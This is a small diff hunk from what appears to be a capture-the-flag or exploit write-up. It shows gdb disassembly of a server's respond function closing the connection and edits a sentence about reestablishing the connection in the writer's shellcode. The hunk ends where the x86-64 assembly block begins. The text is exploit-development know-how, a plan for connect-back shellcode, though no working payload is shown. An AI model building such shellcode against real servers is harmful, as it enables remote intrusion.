@@ -143,7 +143,7 @@ Unfortunately at this point the server has already shut the connection with us d
    0x40153a <respond+1133>    mov    edi, 1
    0x40153f <respond+1138>    call   close@plt <close@plt>
 ```
-Therefor we have to reestablish connection to us. 
+Therefor we have to reestablish connection to us in our shellcode:
 ```
 [bits 64]
 start:
